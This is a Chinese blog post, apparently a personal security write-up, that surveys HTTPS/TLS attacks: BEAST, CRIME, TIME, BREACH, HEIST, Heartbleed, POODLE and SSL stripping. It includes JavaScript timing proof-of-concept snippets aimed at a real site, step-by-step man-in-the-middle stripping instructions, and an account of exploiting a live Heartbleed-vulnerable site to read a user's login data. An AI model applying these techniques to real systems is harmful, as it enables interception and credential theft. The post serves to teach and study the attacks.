@@ -1,0 +1,1302 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/Or1onX.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Or1onX.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Or1onX.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/Or1onX.jpg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="https,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="0x00 前言 HTTPS 的全称是 Hyper Text Transfer Protocol over Secure Socket Layer，从字面上看便可得知其是 HTTP 基于 SSL/TLS 的应用。因此，有许多攻击手法实际上是针对安全套接层的攻击。 本篇文章有如下几个部分组成——协议漏洞分析（目前的 TLS 协议设计比较完善，但对于 较久的版本以及 SSL 协议，有很多设计上的漏洞。可">
+<meta name="keywords" content="https">
+<meta property="og:type" content="article">
+<meta property="og:title" content="https攻击小结">
+<meta property="og:url" content="http://yoursite.com/2018/01/29/https攻击小结/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 前言 HTTPS 的全称是 Hyper Text Transfer Protocol over Secure Socket Layer，从字面上看便可得知其是 HTTP 基于 SSL/TLS 的应用。因此，有许多攻击手法实际上是针对安全套接层的攻击。 本篇文章有如下几个部分组成——协议漏洞分析（目前的 TLS 协议设计比较完善，但对于 较久的版本以及 SSL 协议，有很多设计上的漏洞。可">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwdyjbamsj20in0dnq3j.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwhsb032rj20ft04p74f.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwotg0293j20zm0it758.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwour3yubj20zm0irt9p.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwbhy61mvj20q80a8dkx.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwbln0p5jj20ls00zwf5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwbmj07kyj20g105u414.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwboy8pjdj20lu0badt7.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwplqoyu0j20jz0cz751.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwqsqgjotj20ou07igmc.jpg">
+<meta property="og:updated_time" content="2018-01-29T04:08:43.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="https攻击小结">
+<meta name="twitter:description" content="0x00 前言 HTTPS 的全称是 Hyper Text Transfer Protocol over Secure Socket Layer，从字面上看便可得知其是 HTTP 基于 SSL/TLS 的应用。因此，有许多攻击手法实际上是针对安全套接层的攻击。 本篇文章有如下几个部分组成——协议漏洞分析（目前的 TLS 协议设计比较完善，但对于 较久的版本以及 SSL 协议，有很多设计上的漏洞。可">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/a105112bly1fnwdyjbamsj20in0dnq3j.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/01/29/https攻击小结/">
+
+
+
+
+
+  <title>https攻击小结 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/29/https攻击小结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Or1onX">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Or1onX.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">https攻击小结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-29T11:57:31+08:00">
+                2018-01-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/proto/" itemprop="url" rel="index">
+                    <span itemprop="name">proto</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span id="busuanzi_value_page_pv"></span>次阅读
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul>
+<li>HTTPS 的全称是 <strong>H</strong>yper <strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol over <strong>S</strong>ecure <strong>S</strong>ocket <strong>L</strong>ayer，从字面上看便可得知其是 <strong>HTTP</strong> 基于 <strong>SSL/TLS</strong> 的应用。因此，有许多攻击手法实际上是针对安全套接层的攻击。</li>
+<li>本篇文章有如下几个部分组成——协议漏洞分析（目前的 TLS 协议设计比较完善，但对于 较久的版本以及 SSL 协议，有很多设计上的漏洞。可以借这些现有漏洞进行攻击。<br>）、中间人攻击（逻辑上的攻击）以及一些其他东西。</li>
+<li>文章中若有不当之处，还望师傅们指正 :)<a id="more"></a>
+<h1 id="0x01-协议攻击与漏洞利用"><a href="#0x01-协议攻击与漏洞利用" class="headerlink" title="0x01 协议攻击与漏洞利用"></a>0x01 协议攻击与漏洞利用</h1><h2 id="BEAST-攻击（CVE-2011-3389）"><a href="#BEAST-攻击（CVE-2011-3389）" class="headerlink" title="BEAST 攻击（CVE-2011-3389）"></a>BEAST 攻击（CVE-2011-3389）</h2><h3 id="攻击对象"><a href="#攻击对象" class="headerlink" title="攻击对象"></a>攻击对象</h3></li>
+<li>针对 TLS 1.0 和更早版本的协议中对称加密算法的 CBC 模式<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3></li>
+<li>CBC 模式有两种基本的使用方式：<ol>
+<li>为每个要加密的数据块都准备一个随机数（TLS 1.1、TLS 1.2）</li>
+<li>对加密数据的开头使用一个随机数，之后当前数据块加密之后的密文会作为下一个数据块的 IV（SSL 3、TLS 1.0）</li>
+</ol>
+</li>
+<li>对于下图，M₂ 是保密数据（如cookie等），我们想通过精心构造的 M₃ 去猜测 M₂，具体步骤如下：<br>  <img src="http://ww1.sinaimg.cn/large/a105112bly1fnwdyjbamsj20in0dnq3j.jpg" alt><ol>
+<li>在 CBC 模式中我们知道：<br> C₂ = E(M₂ ⊕ IV₂) = E(M₂ ⊕ C₁)<br> C₃ = E(M₃ ⊕ IV₃) = E(M₃ ⊕ C₂)</li>
+<li>C₁(IV₂)、C₂(IV₃) 是已知的（在网络上传输），假设 Mₓ 是我们要猜测的结果，构造出特殊的 M₃：<br> M₃ = Mₓ ⊕ C₁ ⊕ C₂</li>
+<li>对 M₃ 进行加密：<br> C₃ = E(M₃ ⊕ C₂) = E(Mₓ ⊕ C₁ ⊕ C₂ ⊕ C₂) = E(Mₓ ⊕ C₁)</li>
+<li>当 C₃ 和 C₂ 的值想等时，则可知，此时的 Mₓ 等于 M₂</li>
+</ol>
+</li>
+</ul>
+<h3 id="实际攻击的前提条件"><a href="#实际攻击的前提条件" class="headerlink" title="实际攻击的前提条件"></a>实际攻击的前提条件</h3><ol>
+<li>协议版本 &lt;= TLS 1.0；</li>
+<li>中间人代理（可以截获数据包）；</li>
+<li>影响敏感信息在 HTTP 请求中的位置；</li>
+<li>攻击者能够接管客户端浏览器（执行 JavaScript）。</li>
+</ol>
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><ul>
+<li>github 上给出的一个验证性 PoC <a href="https://github.com/mpgn/BEAST-PoC/blob/master/BEAST-poc.py" target="_blank" rel="noopener">https://github.com/mpgn/BEAST-PoC/blob/master/BEAST-poc.py</a></li>
+</ul>
+<h2 id="CRIME-攻击（CVE-2012-4929）"><a href="#CRIME-攻击（CVE-2012-4929）" class="headerlink" title="CRIME 攻击（CVE-2012-4929）"></a>CRIME 攻击（CVE-2012-4929）</h2><h3 id="压缩旁路攻击"><a href="#压缩旁路攻击" class="headerlink" title="压缩旁路攻击"></a>压缩旁路攻击</h3><ol>
+<li>本质上，所有的无损压缩算法都是通过==去重==的方式展开工作的；</li>
+<li>如果能让任意的数据（猜测数据）和某些加密数据在同一个上下文中被压缩，通过观察压缩数据的输出，能确定猜测是否正确。如下图：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fnwhsb032rj20ft04p74f.jpg" alt><h3 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h3></li>
+</ol>
+<ul>
+<li>与实现 BEAST 一样：<br>  攻击者必须能够<strong>操作受害者的浏览器</strong>来向目标服务器提交大量的请求，与此同时观察网络上发出的数据包。每次请求都将是一次猜测；</li>
+<li>与 BEAST 不同的是，CRIME 对请求的内容和时机没有较强的要求</li>
+</ul>
+<h2 id="TIME-攻击"><a href="#TIME-攻击" class="headerlink" title="TIME 攻击"></a>TIME 攻击</h2><h3 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h3><ul>
+<li>也是一类压缩旁路攻击，CRIME 是通过观察压缩输出中 1 字节的差异来实现攻击（需要比较前后两次包的长度），而 TIME 是通过观察时间差。</li>
+<li>下面就简单介绍 TIME 是如何利用时间信息作为成功匹配字符的判断标准。<ul>
+<li>结合 TCP 中的<strong>窗口控制协议</strong>，我们知道，为了高效的传递数据，TCP 允许通信双方每次发送多个数据包，当然，为了不让任何一端负载过大，他们在建立互连时会协商一个限制，即<strong>拥塞窗口</strong>。拥塞窗口在一开始会比较小，之后会呈现短期的增长趋势，即<strong>慢启动</strong>;</li>
+</ul>
+<ol>
+<li>在初次建立连接的时候，如果发送的数据比较小，不足一个初始的拥塞窗口大小（通常为 15KB），数据将一次发送完毕；</li>
+<li>如果数据很大，则第一次回尽可能多地发送数据，然后等待服务器端的确认，之后再发送剩下的数据。这样会增加一次 RTT（往返时间）；</li>
+<li>为了将此特征作为一个时间预示来使用，我们可以增大数据的大小直到完全填满初始拥塞窗口。如果此时再增加 1 字节，请求就会导致一个额外的 RTT，这种延迟可以通过JavaScript 中判断出来；</li>
+<li>这时，便可以利用压缩，如果构造的数据导致压缩的大小减小了 1 字节，请求将会导致较短的 RTT<h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3>下面是作者给出的PoC<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    author: Amichai Shulman、Tal Be’ery</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeString</span>(<span class="params">index</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> text = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">var</span> possible = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>;</span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">var</span> i=<span class="number">0</span>; i &lt; index; i++ )</span><br><span class="line">        text += possible.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * possible.length));</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xmlhttp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printTime</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> date2 = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">        curTime = date2.getTime();</span><br><span class="line">        <span class="keyword">var</span> n = curTime - ref;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">","</span> + n + <span class="string">"&lt;BR&gt;"</span>);</span><br><span class="line">        <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            count = count - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (count%<span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                len = UrlLegnth;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                len = UrlLegnth + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            SendRequest(len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SendRequest</span>(<span class="params">length</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> garbage1 = makeString(length);</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xmlhttp.onreadystatechange = printTime;</span><br><span class="line">    <span class="built_in">document</span>.write(length);</span><br><span class="line">    <span class="keyword">var</span> site = <span class="string">"http://edition.cnn.com/?"</span>;</span><br><span class="line">    <span class="keyword">var</span> URL = site + garbage1;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>, URL, <span class="literal">true</span>);</span><br><span class="line">    date1 = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    ref = date1.getTime();</span><br><span class="line">    xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UrlLegnth = <span class="number">2588</span>;</span><br><span class="line">SendRequest(UrlLegnth);</span><br><span class="line"><span class="keyword">var</span> date1;</span><br><span class="line"><span class="keyword">var</span> ref;</span><br><span class="line"><span class="keyword">var</span> count =<span class="number">30</span>;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="BREACH（BlackHat，2013）"><a href="#BREACH（BlackHat，2013）" class="headerlink" title="BREACH（BlackHat，2013）"></a>BREACH（BlackHat，2013）</h2><h3 id="攻击原理-3"><a href="#攻击原理-3" class="headerlink" title="攻击原理"></a>攻击原理</h3><ul>
+<li>是一种针对 HTTP 响应的压缩旁路攻击，攻击者需要在响应正文中找到一个注入点，请求的参数(比如一个 CSRF Token）会被响应正文携带回来，当内容有相同时，响应正文会变小（这可以通过观察网络数据获知）。之后的步骤便和 CRIME 一样了。<h3 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h3></li>
+<li>作者给出的 PoC <a href="https://github.com/nealharris/BREACH" target="_blank" rel="noopener">https://github.com/nealharris/BREACH</a></li>
+</ul>
+<h2 id="HEIST-攻击（BlackHat，2016）"><a href="#HEIST-攻击（BlackHat，2016）" class="headerlink" title="HEIST 攻击（BlackHat，2016）"></a>HEIST 攻击（BlackHat，2016）</h2><h3 id="攻击原理-4"><a href="#攻击原理-4" class="headerlink" title="攻击原理"></a>攻击原理</h3><ul>
+<li>HEIST 沿用了 TIME 攻击中利用 TCP 拥塞窗口的边信道攻击，结合了 fetch api 展开压缩旁路攻击。<h3 id="实际攻击的前提条件-1"><a href="#实际攻击的前提条件-1" class="headerlink" title="实际攻击的前提条件"></a>实际攻击的前提条件</h3></li>
+</ul>
+<ol>
+<li><p>采用 gzip/ssl 压缩</p>
+</li>
+<li><p>目标站存在反射点</p>
+<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3></li>
+<li><p>确定响应包大小是否在一个 TCP 窗口内</p>
+<ul>
+<li>在 JS 层面,向目标网站发送一个跨域资源请求,通过 fetch 和 performance 对收到回复的时间点进行观察。假设 T1 为攻击者收到第一个字节是的时间, T2 为攻击者收到完整包的时间,观察 T2-T1 的值,如果这个值很小( 1ms 左右),则 response 仅占用了一个窗口大小;反之,占用多个窗口。例如:  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fetch(url+reflection, &#123;</span><br><span class="line">    mode: <span class="string">'no-cors'</span>,</span><br><span class="line">    credentials: <span class="string">'include'</span></span><br><span class="line">&#125;).then( <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">window</span>.T1 = performance.now();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> resDone = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> [ entries, lastEntry=entries[entries.length<span class="number">-1</span>] ] = [ performance.getEntries() ];</span><br><span class="line">    <span class="keyword">if</span> ( lastEntry.name.startsWith(url) ) &#123;</span><br><span class="line">        <span class="built_in">window</span>.T2 = lastEntry.responseEnd;</span><br><span class="line">        <span class="keyword">if</span> is_singleWin(<span class="built_in">window</span>.T2, <span class="built_in">window</span>.T1) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">setInterval(resDone, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>确定响应包的具体大小</p>
+<ul>
+<li>如图：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fnwotg0293j20zm0it758.jpg" alt><br><img src="http://ww1.sinaimg.cn/large/a105112bly1fnwour3yubj20zm0irt9p.jpg" alt><br>按图示方法逐个试,找到初始窗口大小；</li>
+</ul>
+</li>
+<li><p>对于大的回复包( &gt; 初始化的 cwnd ),进行与第二步同样的探测方法;</p>
+<ul>
+<li>作者给出的方法是:<ol>
+<li>发送请求到已知大小的资源(第 2 步做的工作) ;</li>
+<li>响应进入后,向目标资源发送请求,重复步骤 2</li>
+</ol>
+</li>
+</ul>
+</li>
+<li><p>如果有必要,对 HTTP 2 进行调整;</p>
+<ul>
+<li>这方面还没有深入了解,据作者说, HTTP 2 更容易实施 HEIST 攻击</li>
+</ul>
+</li>
+<li><p>Exploit</p>
+<ul>
+<li>爆破、匹配字符</li>
+</ul>
+</li>
+</ol>
+<h2 id="心脏滴血（CVE-2014-0160）"><a href="#心脏滴血（CVE-2014-0160）" class="headerlink" title="心脏滴血（CVE-2014-0160）"></a>心脏滴血（CVE-2014-0160）</h2><h3 id="攻击对象-1"><a href="#攻击对象-1" class="headerlink" title="攻击对象"></a>攻击对象</h3><ul>
+<li>OpenSSL 1.0.1 - 1.0.1f<h3 id="攻击原理-5"><a href="#攻击原理-5" class="headerlink" title="攻击原理"></a>攻击原理</h3></li>
+<li>OpenSSL 代码中没有对读长度进行检查，攻击者可以利用这个缺陷，在一个 HeartBeat （确保连接保活，检查对端是否可用）请求中获取到服务器进程中最大为 64 KB的数据。通过发出多个这样的请求，攻击者就可以无限制地获取内存数据（如服务器的私钥）。<blockquote>
+<p>心跳（Heartbeat）是一个协议扩展，添加了支持连接保活的功能（检查对端是否仍然可用），以及为 TLS 和 DTLS 发现路径最大传输单元。</p>
+</blockquote>
+<h3 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h3></li>
+<li>正如上面所说的，通过发送多个 HeartBeat 请求可以获取到服务器中的内存内容。这一漏洞是在 2014 年发现的，而直到现在仍然可以寻觅到存在心脏滴血漏洞的网站。</li>
+<li>从 shodan 上搜索 OpenSSL/1.0.1：<br>  <img src="http://ww1.sinaimg.cn/large/a105112bly1fnwbhy61mvj20q80a8dkx.jpg" alt><br>  可以看到 shodan 也提示了该网站受心脏滴血影响</li>
+<li>接下来便可以用一些验证脚本或通过 msf ，可以查看受影响网站的泄漏信息<ol>
+<li>运行工具<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fnwbln0p5jj20ls00zwf5.jpg" alt></li>
+<li>成功读取泄漏的信息<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fnwbmj07kyj20g105u414.jpg" alt></li>
+<li>打开文本查看，在第 13 行处找到不久前某用户在该网站的登录信息<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fnwboy8pjdj20lu0badt7.jpg" alt></li>
+</ol>
+</li>
+<li>当然，上述都是针对服务器的攻击，由于心跳协议是双向的，因此，对于存在漏洞的客户端，在连接到一个恶意网站时，客户端的部分内存数据也会遭到泄漏。</li>
+</ul>
+<h2 id="POODLE（CVE-2014-3566）"><a href="#POODLE（CVE-2014-3566）" class="headerlink" title="POODLE（CVE-2014-3566）"></a>POODLE（CVE-2014-3566）</h2><h3 id="攻击原理-6"><a href="#攻击原理-6" class="headerlink" title="攻击原理"></a>攻击原理</h3><ul>
+<li>POODLE 的根本原因是CBC模式在设计上的缺陷，具体来说就是CBC只对明文进行了身份验证，但是没有对填充字节进行完整性校验。这使得攻击者可以对填充字节修改并且利用填充预示来恢复加密内容，让POODLE攻击成为可能的原因是SSL3中过于松散的填充结构和校验规则。</li>
+<li>在实际应用场景中，通常需要结合中间人，迫使握手使用一个低等级的协议或者使用低强度的密码套件，实现自愿降级，之后再结合 POODLE 。</li>
+</ul>
+<h1 id="0x02-中间人攻击"><a href="#0x02-中间人攻击" class="headerlink" title="0x02 中间人攻击"></a>0x02 中间人攻击</h1><h2 id="SSL-剥离攻击"><a href="#SSL-剥离攻击" class="headerlink" title="SSL 剥离攻击"></a>SSL 剥离攻击</h2><h3 id="攻击原理-7"><a href="#攻击原理-7" class="headerlink" title="攻击原理"></a>攻击原理</h3><ul>
+<li>中间人与客户端维持 HTTP 流，与服务器维持 HTTPS 流<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fnwplqoyu0j20jz0cz751.jpg" alt><h3 id="实际攻击的前提条件-2"><a href="#实际攻击的前提条件-2" class="headerlink" title="实际攻击的前提条件"></a>实际攻击的前提条件</h3></li>
+</ul>
+<ol>
+<li>网站不在 HSTS Preload List 中</li>
+<li>客户端首次访问时发起的是 HTTP 访问<h3 id="具体步骤-1"><a href="#具体步骤-1" class="headerlink" title="具体步骤"></a>具体步骤</h3></li>
+<li>客户端向某网站发起 HTTP 访问（http://……）；</li>
+<li>中间人拦截该请求（http://……）并转发给服务端；</li>
+<li>中间人收到服务端的响应后（301/302 跳转）立刻重定向到 https://……，并与服务端维持 SSL/TLS 连接；</li>
+<li>中间人在本地解密从服务端接收到的 Web 内容，并将其中 <code>&lt;a href=”https：//...”&gt;</code> 替换成 <code>&lt;a href=”http：//...”&gt;</code>，将<code>Location：https：//...</code> 替换成 <code>Location：http：//...</code>，同时记录下所修改的 URL，并保存；</li>
+<li>中间人将修改后的数据（HTTP）发给客户端；</li>
+<li>客户端向服务器发送 HTTP 请求，中间人将其与保存的文件相比较，发现有修改的HTTP URL时，替换成原 HTTPS URL，并发送给服务器。</li>
+</ol>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
+<li>sslstrip（kali 自带）<ul>
+<li><a href="https://github.com/moxie0/sslstrip" target="_blank" rel="noopener">具体操作及源码</a></li>
+</ul>
+</li>
